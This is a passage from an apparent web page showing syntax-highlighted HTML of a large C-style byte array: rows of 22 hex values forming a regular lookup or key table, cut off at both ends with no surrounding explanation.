class="number">0x05</span>, <span class="number">0x82</span>, <span class="number">0xde</span>, <span class="number">0xc4</span>, <span class="number">0x5e</span>, <span class="number">0xa4</span>, <span class="number">0xc1</span>, <span class="number">0xae</span>, <span class="number">0x51</span>, <span class="number">0x24</span>, <span class="number">0xe6</span>, <span class="number">0x46</span>, <span class="number">0xfe</span>, <span class="number">0xb9</span>, <span class="number">0x32</span>, <span class="number">0xc0</span>, <span class="number">0x72</span>, <span class="number">0x99</span>, <span class="number">0x7f</span>, <span class="number">0xa8</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xfe</span>, <span class="number">0xd4</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0xdd</span>, <span class="number">0xc7</span>, <span class="number">0x5d</span>, <span class="number">0xa7</span>, <span class="number">0xc2</span>, <span class="number">0xad</span>, <span class="number">0x52</span>, <span class="number">0x27</span>, <span class="number">0xe5</span>, <span class="number">0x45</span>, <span class="number">0xfd</span>, <span class="number">0xba</span>, <span class="number">0x31</span>, <span class="number">0xc3</span>, <span class="number">0x71</span>, <span class="number">0x9a</span>, <span class="number">0x7c</span>, <span class="number">0xab</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x07</span>, <span class="number">0x80</span>, <span class="number">0xdc</span>, <span class="number">0xc6</span>, <span class="number">0x5c</span>, <span class="number">0xa6</span>, <span class="number">0xc3</span>, <span class="number">0xac</span>, <span class="number">0x53</span>, <span class="number">0x26</span>, <span class="number">0xe4</span>, <span class="number">0x44</span>, <span class="number">0xfc</span>, <span class="number">0xbb</span>, <span class="number">0x30</span>, <span class="number">0xc2</span>, <span class="number">0x70</span>, <span class="number">0x9b</span>, <span class="number">0x7d</span>, <span class="number">0xaa</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xf8</span>, <span class="number">0xd2</span>, <span class="number">0x00</span>, <span class="number">0x87</span>, <span class="number">0xdb</span>, <span class="number">0xc1</span>, <span class="number">0x5b</span>, <span class="number">0xa1</span>, <span class="number">0xc4</span>, <span class="number">0xab</span>, <span class="number">0x54</span>, <span class="number">0x21</span>, <span class="number">0xe3</span>, <span class="number">0x43</span>, <span class="number">0xfb</span>, <span class="number">0xbc</span>, <span class="number">0x37</span>, <span class="number">0xc5</span>, <span class="number">0x77</span>, <span class="number">0x9c</span>, <span class="number">0x7a</span>, <span class="number">0xad</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xf9</span>, <span class="number">0xd3</span>, <span class="number">0x01</span>, <span class="number">0x86</span>, <span class="number">0xda</span>, <span class="number">0xc0</span>, <span class="number">0x5a</span>, <span class="number">0xa0</span>, <span class="number">0xc5</span>, <span class="number">0xaa</span>, <span class="number">0x55</span>, <span class="number">0x20</span>, <span class="number">0xe2</span>, <span class="number">0x42</span>, <span class="number">0xfa</span>, <span class="number">0xbd</span>, <span class="number">0x36</span>, <span class="number">0xc4</span>, <span class="number">0x76</span>, <span class="number">0x9d</span>, <span class="number">0x7b</span>, <span class="number">0xac</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xfa</span>, <span class="number">0xd0</span>, <span class="number">0x02</span>, <span class="number">0x85</span>, <span class="number">0xd9</span>, <span class="number">0xc3</span>, <span class="number">0x59</span>, <span class="number">0xa3</span>, <span class="number">0xc6</span>, <span class="number">0xa9</span>, <span class="number">0x56</span>, <span class="number">0x23</span>, <span class="number">0xe1</span>, <span class="number">0x41</span>, <span class="number">0xf9</span>, <span class="number">0xbe</span>, <span class="number">0x35</span>, <span class="number">0xc7</span>, <span class="number">0x75</span>, <span class="number">0x9e</span>, <span class="number">0x78</span>, <span class="number">0xaf</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xfb</span>, <span class="number">0xd1</span>, <span class="number">0x03</span>, <span class="number">0x84</span>, <span class="number">0xd8</span>, <span class="number">0xc2</span>, <span class="number">0x58</span>, <span class="number">0xa2</span>, <span class="number">0xc7</span>, <span class="number">0xa8</span>, <span class="number">0x57</span>, <span class="number">0x22</span>, <span class="number">0xe0</span>, <span class="number">0x40</span>, <span class="number">0xf8</span>, <span class="number">0xbf</span>, <span class="number">0x34</span>, <span class="number">0xc6</span>, <span class="number">0x74</span>, <span class="number">0x9f</span>, <span class="number">0x79</span>, <span class="number">0xae</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x84</span>, <span class="number">0xae</span>, <span class="number">0x7c</span>, <span class="number">0xfb</span>, <span class="number">0xa7</span>, <span class="number">0xbd</span>, <span class="number">0x27</span>, <span class="number">0xdd</span>, <span class="number">0xb8</span>, <span class="number">0xd7</span>, <span class="number">0x28</span>, <span class="number">0x5d</span>, <span class="number">0x9f</span>, <span class="number">0x3f</span>, <span class="number">0x87</span>, <span class="number">0xc0</span>, <span class="number">0x4b</span>, <span class="number">0xb9</span>, <span class="number">0x0b</span>, <span class="number">0xe0</span>, <span class="number">0x06</span>, <span class="number">0xd1</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x85</span>, <span class="number">0xaf</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0xa6</span>, <span class="number">0xbc</span>, <span class="number">0x26</span>, <span class="number">0xdc</span>, <span class="number">0xb9</span>, <span class="number">0xd6</span>, <span class="number">0x29</span>, <span class="number">0x5c</span>, <span class="number">0x9e</span>, <span class="number">0x3e</span>, <span class="number">0x86</span>, <span class="number">0xc1</span>, <span class="number">0x4a</span>, <span class="number">0xb8</span>, <span class="number">0x0a</span>, <span class="number">0xe1</span>, <span class="number">0x07</span>, <span class="number">0xd0</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x86</span>, <span class="number">0xac</span>, <span class="number">0x7e</span>, <span class="number">0xf9</span>, <span class="number">0xa5</span>, <span class="number">0xbf</span>, <span class="number">0x25</span>, <span class="number">0xdf</span>, <span class="number">0xba</span>, <span class="number">0xd5</span>, <span class="number">0x2a</span>, <span class="number">0x5f</span>, <span class="number">0x9d</span>, <span class="number">0x3d</span>, <span class="number">0x85</span>, <span class="number">0xc2</span>, <span class="number">0x49</span>, <span class="number">0xbb</span>, <span class="number">0x09</span>, <span class="number">0xe2</span>, <span class="number">0x04</span>, <span class="number">0xd3</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x87</span>, <span class="number">0xad</span>, <span class="number">0x7f</span>, <span class="number">0xf8</span>, <span class="number">0xa4</span>, <span class="number">0xbe</span>, <span class="number">0x24</span>, <span class="number">0xde</span>, <span class="number">0xbb</span>, <span class="number">0xd4</span>, <span class="number">0x2b</span>, <span class="number">0x5e</span>, <span class="number">0x9c</span>, <span class="number">0x3c</span>, <span class="number">0x84</span>, <span class="number">0xc3</span>, <span class="number">0x48</span>, <span class="number">0xba</span>, <span class="number">0x08</span>, <span class="number">0xe3</span>, <span class="number">0x05</span>, <span class="number">0xd2</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x80</span>, <span class="number">0xaa</span>, <span class="number">0x78</span>, <span class="number">0xff</span>, <span class="number">0xa3</span>, <span class="number">0xb9</span>, <span class="number">0x23</span>, <span class="number">0xd9</span>, <span class="number">0xbc</span>, <span class="number">0xd3</span>, <span class="number">0x2c</span>, <span class="number">0x59</span>, <span class="number">0x9b</span>, <span class="number">0x3b</span>, <span class="number">0x83</span>, <span class="number">0xc4</span>, <span class="number">0x4f</span>, <span class="number">0xbd</span>, <span class="number">0x0f</span>, <span class="number">0xe4</span>, <span class="number">0x02</span>, <span class="number">0xd5</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x81</span>, <span class="number">0xab</span>, <span class="number">0x79</span>, <span class="number">0xfe</span>, <span class="number">0xa2</span>, <span class="number">0xb8</span>, <span class="number">0x22</span>, <span class="number">0xd8</span>, <span class="number">0xbd</span>, <span class="number">0xd2</span>, <span class="number">0x2d</span>, <span class="number">0x58</span>, <span class="number">0x9a</span>, <span class="number">0x3a</span>, <span class="number">0x82</span>, <span class="number">0xc5</span>, <span class="number">0x4e</span>, <span class="number">0xbc</span>, <span class="number">0x0e</span>, <span class="number">0xe5</span>, <span class="number">0x03</span>, <span class="number">0xd4</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x82</span>, <span class="number">0xa8</span>, <span class="number">0x7a</span>, <span class="number">0xfd</span>, <span class="number">0xa1</span>, <span class="number">0xbb</span>, <span class="number">0x21</span>, <span class="number">0xdb</span>, <span class="number">0xbe</span>, <span class="number">0xd1</span>, <span class="number">0x2e</span>, <span class="number">0x5b</span>, <span class="number">0x99</span>, <span class="number">0x39</span>, <span class="number">0x81</span>, <span class="number">0xc6</span>, <span class="number">0x4d</span>, <span class="number">0xbf</span>, <span class="number">0x0d</span>, <span class="number">0xe6</span>, <span class="number">0x00</span>, <span class="number">0xd7</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x83</span>, <span class="number">0xa9</span>, <span class="number">0x7b</span>, <span class="number">0xfc</span>, <span class="number">0xa0</span>, <span class="number">0xba</span>, <span class="number">0x20</span>, <span class="number">0xda</span>, <span class="number">0xbf</span>, <span class="number">0xd0</span>, <span class="number">0x2f</span>, <span class="number">0x5a</span>, <span class="number">0x98</span>, <span class="number">0x38</span>, <span class="number">0x80</span>, <span class="number">0xc7</span>, <span class="number">0x4c</span>, <span class="number">0xbe</span>, <span class="number">0x0c</span>, <span class="number">0xe7</span>, <span class="number">0x01</span>, <span class="number">0xd6</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x8c</span>, <span class="number">0xa6</span>, <span class="number">0x74</span>, <span class="number">0xf3</span>, <span class="number">0xaf</span>, <span class="number">0xb5</span>, <span class="number">0x2f</span>, <span class="number">0xd5</span>, <span class="number">0xb0</span>, <span class="number">0xdf</span>, <span class="number">0x20</span>, <span class="number">0x55</span>, <span class="number">0x97</span>, <span class="number">0x37</span>, <span class="number">0x8f</span>, <span class="number">0xc8</span>, <span class="number">0x43</span>, <span class="number">0xb1</span>, <span class="number">0x03</span>, <span class="number">0xe8</span>, <span class="number">0x0e</span>, <span class="number">0xd9</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x8d</span>, <span class="number">0xa7</span>, <span class="number">0x75</span>, <span class="number">0xf2</span>, <span class="number">0xae</span>, <span class="number">0xb4</span>, <span class="number">0x2e</span>, <span class="number">0xd4</span>, <span class="number">0xb1</span>, <span class="number">0xde</span>, <span class="number">0x21</span>, <span class="number">0x54</span>, <span class="number">0x96</span>, <span class="number">0x36</span>, <span class="number">0x8e</span>, <span class="number">0xc9</span>, <span class="number">0x42</span>, <span class="number">0xb0</span>, <span class="number">0x02</span>, <span class="number">0xe9</span>, <span class="number">0x0f</span>, <span class="number">0xd8</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x8e</span>, <span class="number">0xa4</span>, <span class="number">0x76</span>, <span class="number">0xf1</span>, <span class="number">0xad</span>, <span class="number">0xb7</span>, <span class="number">0x2d</span>, <span class="number">0xd7</span>, <span class="number">0xb2</span>, <span class="number">0xdd</span>, <span class="number">0x22</span>, <span class="number">0x57</span>, <span class="number">0x95</span>, <span class="number">0x35</span>, <span class="number">0x8d</span>, <span class="number">0xca</span>, <span class="number">0x41</span>, <span class="number">0xb3</span>, <span class="number">0x01</span>, <span class="number">0xea</span>, <span class="number">0x0c</span>, <span class="number">0xdb</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x8f</span>, <span class="number">0xa5</span>, <span class="number">0x77</span>, <span class="number">0xf0</span>, <span class="number">0xac</span>, <span class="number">0xb6</span>, <span class="number">0x2c</span>, <span class="number">0xd6</span>, <span class="number">0xb3</span>, <span class="number">0xdc</span>, <span class="number">0x23</span>, <span class="number">0x56</span>, <span class="number">0x94</span>, <span class="number">0x34</span>, <span class="number">0x8c</span>, <span class="number">0xcb</span>, <span class="number">0x40</span>, <span class="number">0xb2</span>, <span class="number">0x00</span>, <span class="number">0xeb</span>, <span class="number">0x0d</span>, <span class="number">0xda</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x88</span>, <span class="number">0xa2</span>, <span class="number">0x70</span>, <span class="number">0xf7</span>, <span class="number">0xab</span>, <span class="number">0xb1</span>, <span class="number">0x2b</span>, <span class="number">0xd1</span>, <span class="number">0xb4</span>, <span class="number">0xdb</span>, <span class="number">0x24</span>, <span class="number">0x51</span>, <span class="number">0x93</span>, <span class="number">0x33</span>, <span class="number">0x8b</span>, <span class="number">0xcc</span>, <span class="number">0x47</span>, <span class="number">0xb5</span>, <span class="number">0x07</span>, <span class="number">0xec</span>, <span class="number">0x0a</span>, <span class="number">0xdd</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x89</span>, <span class="number">0xa3</span>, <span class="number">0x71</span>, <span class="number">0xf6</span>, <span class="number">0xaa</span>, <span class="number">0xb0</span>, <span class="number">0x2a</span>, <span class="number">0xd0</span>, <span class="number">0xb5</span>, <span class="number">0xda</span>, <span class="number">0x25</span>, <span class="number">0x50</span>, <span class="number">0x92</span>, <span class="number">0x32</span>, <span class="number">0x8a</span>, <span class="number">0xcd</span>, <span class="number">0x46</span>, <span class="number">0xb4</span>, <span class="number">0x06</span>, <span class="number">0xed</span>, <span class="number">0x0b</span>, <span class="number">0xdc</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x8a</span>, <span class="number">0xa0</span>, <span class="number">0x72</span>, <span class="number">0xf5</span>, <span class="number">0xa9</span>, <span class="number">0xb3</span>, <span class="number">0x29</span>, <span class="number">0xd3</span>, <span class="number">0xb6</span>, <span class="number">0xd9</span>, <span class="number">0x26</span>, <span class="number">0x53</span>, <span class="number">0x91</span>, <span class="number">0x31</span>, <span class="number">0x89</span>, <span class="number">0xce</span>, <span class="number">0x45</span>, <span class="number">0xb7</span>, <span class="number">0x05</span>, <span class="number">0xee</span>, <span class="number">0x08</span>, <span class="number">0xdf</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x8b</span>, <span class="number">0xa1</span>, <span class="number">0x73</span>, <span class="number">0xf4</span>, <span class="number">0xa8</span>, <span class="number">0xb2</span>, <span class="number">0x28</span>, <span class="number">0xd2</span>, <span class="number">0xb7</span>, <span class="number">0xd8</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x90</span>, <span class="number">0x30</span>, <span class="number">0x88</span>, <span class="number">0xcf</span>, <span class="number">0x44</span>, <span class="number">0xb6</span>, <span class="number">0x04</span>, <span class="number">0xef</span>, <span class="number">0x09</span>, <span class="number">0xde</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x94</span>, <span class="number">0xbe</span>, <span class="number">0x6c</span>, <span class="number">0xeb</span>, <span class="number">0xb7</span>, <span class="number">0xad</span>, <span class="number">0x37</span>, <span class="number">0xcd</span>, <span class="number">0xa8</span>, <span class="number">0xc7</span>, <span class="number">0x38</span>, <span class="number">0x4d</span>, <span class="number">0x8f</span>, <span class="number">0x2f</span>, <span class="number">0x97</span>, <span class="number">0xd0</span>, <span class="number">0x5b</span>, <span class="number">0xa9</span>, <span class="number">0x1b</span>, <span class="number">0xf0</span>, <span class="number">0x16</span>, <span class="number">0xc1</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x95</span>, <span class="number">0xbf</span>, <span class="number">0x6d</span>, <span class="number">0xea</span>, <span class="number">0xb6</span>, <span class="number">0xac</span>, <span class="number">0x36</span>, <span class="number">0xcc</span>, <span class="number">0xa9</span>, <span class="number">0xc6</span>, <span class="number">0x39</span>, <span class="number">0x4c</span>, <span class="number">0x8e</span>, <span class="number">0x2e</span>, <span class="number">0x96</span>, <span class="number">0xd1</span>, <span class="number">0x5a</span>, <span class="number">0xa8</span>, <span class="number">0x1a</span>, <span class="number">0xf1</span>, <span class="number">0x17</span>, <span class="number">0xc0</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x96</span>, <span class="number">0xbc</span>, <span class="number">0x6e</span>, <span class="number">0xe9</span>, <span class="number">0xb5</span>, <span class="number">0xaf</span>, <span class="number">0x35</span>, <span class="number">0xcf</span>, <span class="number">0xaa</span>, <span class="number">0xc5</span>, <span class="number">0x3a</span>, <span class="number">0x4f</span>, <span class="number">0x8d</span>, <span class="number">0x2d</span>, <span class="number">0x95</span>, <span class="number">0xd2</span>, <span class="number">0x59</span>, <span class="number">0xab</span>, <span class="number">0x19</span>, <span class="number">0xf2</span>, <span class="number">0x14</span>, <span class="number">0xc3</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x97</span>, <span class="number">0xbd</span>, <span class="number">0x6f</span>, <span class="number">0xe8</span>, <span class="number">0xb4</span>, <span class="number">0xae</span>, <span class="number">0x34</span>, <span class="number">0xce</span>, <span class="number">0xab</span>, <span class="number">0xc4</span>, <span class="number">0x3b</span>, <span class="number">0x4e</span>, <span class="number">0x8c</span>, <span class="number">0x2c</span>, <span class="number">0x94</span>, <span class="number">0xd3</span>, <span class="number">0x58</span>, <span class="number">0xaa</span>, <span class="number">0x18</span>, <span class="number">0xf3</span>, <span class="number">0x15</span>, <span class="number">0xc2</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x90</span>, <span class="number">0xba</span>, <span class="number">0x68</span>, <span class="number">0xef</span>, <span class="number">0xb3</span>, <span class="number">0xa9</span>, <span class="number">0x33</span>, <span class="number">0xc9</span>, <span class="number">0xac</span>, <span class="number">0xc3</span>, <span class="number">0x3c</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x2b</span>, <span class="number">0x93</span>, <span class="number">0xd4</span>, <span class="number">0x5f</span>, <span class="number">0xad</span>, <span class="number">0x1f</span>, <span class="number">0xf4</span>, <span class="number">0x12</span>, <span class="number">0xc5</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x91</span>, <span class="number">0xbb</span>, <span class="number">0x69</span>, <span class="number">0xee</span>, <span class="number">0xb2</span>, <span class="number">0xa8</span>, <span class="number">0x32</span>, <span class="number">0xc8</span>, <span class="number">0xad</span>, <span class="number">0xc2</span>, <span class="number">0x3d</span>, <span class="number">0x48</span>, <span class="number">0x8a</span>, <span class="number">0x2a</span>, <span class="number">0x92</span>, <span class="number">0xd5</span>, <span class="number">0x5e</span>, <span class="number">0xac</span>, <span class="number">0x1e</span>, <span class="number">0xf5</span>, <span class="number">0x13</span>, <span class="number">0xc4</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x92</span>, <span class="number">0xb8</span>, <span class="number">0x6a</span>, <span class="number">0xed</span>, <span class="number">0xb1</span>, <span class="number">0xab</span>, <span class="number">0x31</span>, <span class="number">0xcb</span>, <span class="number">0xae</span>, <span class="number">0xc1</span>, <span class="number">0x3e</span>, <span class="number">0x4b</span>, <span class="number">0x89</span>, <span class="number">0x29</span>, <span class="number">0x91</span>, <span class="number">0xd6</span>, <span class="number">0x5d</span>, <span class="number">0xaf</span>, <span class="number">0x1d</span>, <span class="number">0xf6</span>, <span class="number">0x10</span>, <span class="number">0xc7</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x93</span>, <span class="number">0xb9</span>, <span class="number">0x6b</span>, <span class="number">0xec</span>, <span class="number">0xb0</span>, <span class="number">0xaa</span>, <span class="number">0x30</span>, <span class="number">0xca</span>, <span class="number">0xaf</span>, <span class="number">0xc0</span>, <span class="number">0x3f</span>, <span class="number">0x4a</span>, <span class="number">0x88</span>, <span class="number">0x28</span>, <span class="number">0x90</span>, <span class="number">0xd7</span>, <span class="number">0x5c</span>, <span class="number">0xae</span>, <span class="number">0x1c</span>, <span class="number">0xf7</span>, <span class="number">0x11</span>, <span class="number">0xc6</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x9c</span>, <span class="number">0xb6</span>, <span class="number">0x64</span>, <span class="number">0xe3</span>, <span class="number">0xbf</span>, <span class="number">0xa5</span>, <span class="number">0x3f</span>, <span class="number">0xc5</span>, <span class="number">0xa0</span>, <span class="number">0xcf</span>, <span class="number">0x30</span>, <span class="number">0x45</span>, <span class="number">0x87</span>, <span class="number">0x27</span>, <span class="number">0x9f</span>, <span class="number">0xd8</span>, <span class="number">0x53</span>, <span class="number">0xa1</span>, <span class="number">0x13</span>, <span class="number">0xf8</span>, <span class="number">0x1e</span>, <span class="number">0xc9</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x9d</span>, <span class="number">0xb7</span>, <span class="number">0x65</span>, <span class="number">0xe2</span>, <span class="number">0xbe</span>, <span class="number">0xa4</span>, <span class="number">0x3e</span>, <span class="number">0xc4</span>, <span class="number">0xa1</span>, <span class="number">0xce</span>, <span class="number">0x31</span>, <span class="number">0x44</span>, <span class="number">0x86</span>, <span class="number">0x26</span>, <span class="number">0x9e</span>, <span class="number">0xd9</span>, <span class="number">0x52</span>, <span class="number">0xa0</span>, <span class="number">0x12</span>, <span class="number">0xf9</span>, <span class="number">0x1f</span>, <span class="number">0xc8</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x9e</span>, <span class="number">0xb4</span>, <span class="number">0x66</span>, <span class="number">0xe1</span>, <span class="number">0xbd</span>, <span class="number">0xa7</span>, <span class="number">0x3d</span>, <span class="number">0xc7</span>, <span class="number">0xa2</span>, <span class="number">0xcd</span>, <span class="number">0x32</span>, <span class="number">0x47</span>, <span class="number">0x85</span>, <span class="number">0x25</span>, <span class="number">0x9d</span>, <span class="number">0xda</span>, <span class="number">0x51</span>, <span class="number">0xa3</span>, <span class="number">0x11</span>, <span class="number">0xfa</span>, <span class="number">0x1c</span>, <span class="number">0xcb</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x9f</span>, <span class="number">0xb5</span>, <span class="number">0x67</span>, <span class="number">0xe0</span>, <span class="number">0xbc</span>, <span class="number">0xa6</span>, <span class="number">0x3c</span>, <span class="number">0xc6</span>, <span class="number">0xa3</span>, <span class="number">0xcc</span>, <span class="number">0x33</span>, <span class="number">0x46</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x9c</span>, <span class="number">0xdb</span>, <span class="number">0x50</span>, <span class="number">0xa2</span>, <span class="number">0x10</span>, <span class="number">0xfb</span>, <span class="number">0x1d</span>, <span class="number">0xca</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x98</span>, <span class="number">0xb2</span>, <span class="number">0x60</span>, <span class="number">0xe7</span>, <span class="number">0xbb</span>, <span class="number">0xa1</span>, <span class="number">0x3b</span>, <span class="number">0xc1</span>, <span class="number">0xa4</span>, <span class="number">0xcb</span>, <span class="number">0x34</span>, <span class="number">0x41</span>, <span class="number">0x83</span>, <span class="number">0x23</span>, <span class="number">0x9b</span>, <span class="number">0xdc</span>, <span class="number">0x57</span>, <span class="number">0xa5</span>, <span class="number">0x17</span>, <span class="number">0xfc</span>, <span class="number">0x1a</span>, <span class="number">0xcd</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x99</span>, <span class="number">0xb3</span>, <span class="number">0x61</span>, <span class="number">0xe6</span>, <span class="number">0xba</span>, <span class="number">0xa0</span>, <span class="number">0x3a</span>, <span class="number">0xc0</span>, <span class="number">0xa5</span>, <span class="number">0xca</span>, <span class="number">0x35</span>, <span class="number">0x40</span>, <span class="number">0x82</span>, <span class="number">0x22</span>, <span class="number">0x9a</span>, <span class="number">0xdd</span>, <span class="number">0x56</span>, <span class="number">0xa4</span>, <span class="number">0x16</span>, <span class="number">0xfd</span>, <span class="number">0x1b</span>, <span class="number">0xcc</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x9a</span>, <span class="number">0xb0</span>, <span class="number">0x62</span>, <span class="number">0xe5</span>, <span class="number">0xb9</span>, <span class="number">0xa3</span>, <span class="number">0x39</span>, <span class="number">0xc3</span>, <span class="number">0xa6</span>, <span class="number">0xc9</span>, <span class="number">0x36</span>, <span class="number">0x43</span>, <span class="number">0x81</span>, <span class="number">0x21</span>, <span class="number">0x99</span>, <span class="number">0xde</span>, <span class="number">0x55</span>, <span class="number">0xa7</span>, <span class="number">0x15</span>, <span class="number">0xfe</span>, <span class="number">0x18</span>, <span class="number">0xcf</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x9b</span>, <span class="number">0xb1</span>, <span class="number">0x63</span>, <span class="number">0xe4</span>, <span class="number">0xb8</span>, <span class="number">0xa2</span>, <span class="number">0x38</span>, <span class="number">0xc2</span>, <span class="number">0xa7</span>, <span class="number">0xc8</span>, <span class="number">0x37</span>, <span class="number">0x42</span>, <span class="number">0x80</span>, <span class="number">0x20</span>, <span class="number">0x98</span>, <span class="number">0xdf</span>, <span class="number">0x54</span>, <span class="number">0xa6</span>, <span class="number">0x14</span>, <span class="number">0xff</span>, <span class="number">0x19</span>, <span class="number">0xce</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xa4</span>, <span class="number">0x8e</span>, <span class="number">0x5c</span>, <span class="number">0xdb</span>, <span class="number">0x87</span>, <span class="number">0x9d</span>, <span class="number">0x07</span>, <span class="number">0xfd</span>, <span class="number">0x98</span>, <span class="number">0xf7</span>, <span class="number">0x08</span>, <span class="number">0x7d</span>, <span class="number">0xbf</span>, <span class="number">0x1f</span>, <span class="number">0xa7</span>, <span class="number">0xe0</span>, <span class="number">0x6b</span>, <span class="number">0x99</span>, <span class="number">0x2b</span>, <span class="number">0xc0</span>, <span class="number">0x26</span>, <span class="number">0xf1</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xa5</span>, <span class="number">0x8f</span>, <span class="number">0x5d</span>, <span class="number">0xda</span>, <span class="number">0x86</span>, <span class="number">0x9c</span>, <span class="number">0x06</span>, <span class="number">0xfc</span>, <span class="number">0x99</span>, <span class="number">0xf6</span>, <span class="number">0x09</span>, <span class="number">0x7c</span>, <span class="number">0xbe</span>, <span class="number">0x1e</span>, <span class="number">0xa6</span>, <span class="number">0xe1</span>, <span class="number">0x6a</span>, <span class="number">0x98</span>, <span class="number">0x2a</span>, <span class="number">0xc1</span>, <span class="number">0x27</span>, <span class="number">0xf0</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xa6</span>, <span class="number">0x8c</span>, <span class="number">0x5e</span>, <span class="number">0xd9</span>, <span class="number">0x85</span>, <span class="number">0x9f</span>, <span class="number">0x05</span>, <span class="number">0xff</span>, <span class="number">0x9a</span>, <span class="number">0xf5</span>, <span class="number">0x0a</span>, <span class="number">0x7f</span>, <span class="number">0xbd</span>, <span class="number">0x1d</span>, <span class="number">0xa5</span>, <span class="number">0xe2</span>, <span class="number">0x69</span>, <span class="number">0x9b</span>, <span class="number">0x29</span>, <span class="number">0xc2</span>, <span class="number">0x24</span>, <span class="number">0xf3</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xa7</span>, <span class="number">0x8d</span>, <span class="number">0x5f</span>, <span class="number">0xd8</span>, <span class="number">0x84</span>, <span class="number">0x9e</span>, <span class="number">0x04</span>, <span class="number">0xfe</span>, <span class="number">0x9b</span>, <span class="number">0xf4</span>, <span class="number">0x0b</span>, <span class="number">0x7e</span>, <span class="number">0xbc</span>, <span class="number">0x1c</span>, <span class="number">0xa4</span>, <span class="number">0xe3</span>, <span class="number">0x68</span>, <span class="number">0x9a</span>, <span class="number">0x28</span>, <span class="number">0xc3</span>, <span class="number">0x25</span>, <span class="number">0xf2</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xa0</span>, <span class="number">0x8a</span>, <span class="number">0x58</span>, <span class="number">0xdf</span>, <span class="number">0x83</span>, <span class="number">0x99</span>, <span class="number">0x03</span>, <span class="number">0xf9</span>, <span class="number">0x9c</span>, <span class="number">0xf3</span>, <span class="number">0x0c</span>, <span class="number">0x79</span>, <span class="number">0xbb</span>, <span class="number">0x1b</span>, <span class="number">0xa3</span>, <span class="number">0xe4</span>, <span class="number">0x6f</span>, <span class="number">0x9d</span>, <span class="number">0x2f</span>, <span class="number">0xc4</span>, <span class="number">0x22</span>, <span class="number">0xf5</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xa1</span>, <span class="number">0x8b</span>, <span class="number">0x59</span>, <span class="number">0xde</span>, <span class="number">0x82</span>, <span class="number">0x98</span>, <span class="number">0x02</span>, <span class="number">0xf8</span>, <span class="number">0x9d</span>, <span class="number">0xf2</span>, <span class="number">0x0d</span>, <span class="number">0x78</span>, <span class="number">0xba</span>, <span class="number">0x1a</span>, <span class="number">0xa2</span>, <span class="number">0xe5</span>, <span class="number">0x6e</span>, <span class="number">0x9c</span>, <span class="number">0x2e</span>, <span class="number">0xc5</span>, <span class="number">0x23</span>, <span class="number">0xf4</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xa2</span>, <span class="number">0x88</span>, <span class="number">0x5a</span>, <span class="number">0xdd</span>, <span class="number">0x81</span>, <span class="number">0x9b</span>, <span class="number">0x01</span>, <span class="number">0xfb</span>, <span class="number">0x9e</span>, <span class="number">0xf1</span>, <span class="number">0x0e</span>, <span class="number">0x7b</span>, <span class="number">0xb9</span>, <span class="number">0x19</span>, <span class="number">0xa1</span>, <span class="number">0xe6</span>, <span class="number">0x6d</span>, <span class="number">0x9f</span>, <span class="number">0x2d</span>, <span class="number">0xc6</span>, <span class="number">0x20</span>, <span class="number">0xf7</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xa3</span>, <span class="number">0x89</span>, <span class="number">0x5b</span>, <span class="number">0xdc</span>, <span class="number">0x80</span>, <span class="number">0x9a</span>, <span class="number">0x00</span>, <span class="number">0xfa</span>, <span class="number">0x9f</span>, <span class="number">0xf0</span>, <span class="number">0x0f</span>, <span class="number">0x7a</span>, <span class="number">0xb8</span>, <span class="number">0x18</span>, <span class="number">0xa0</span>, <span class="number">0xe7</span>, <span class="number">0x6c</span>, <span class="number">0x9e</span>, <span class="number">0x2c</span>, <span class="number">0xc7</span>, <span class="number">0x21</span>, <span class="number">0xf6</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xac</span>, <span class="number">0x86</span>, <span class="number">0x54</span>, <span class="number">0xd3</span>, <span class="number">0x8f</span>, <span class="number">0x95</span>, <span class="number">0x0f</span>, 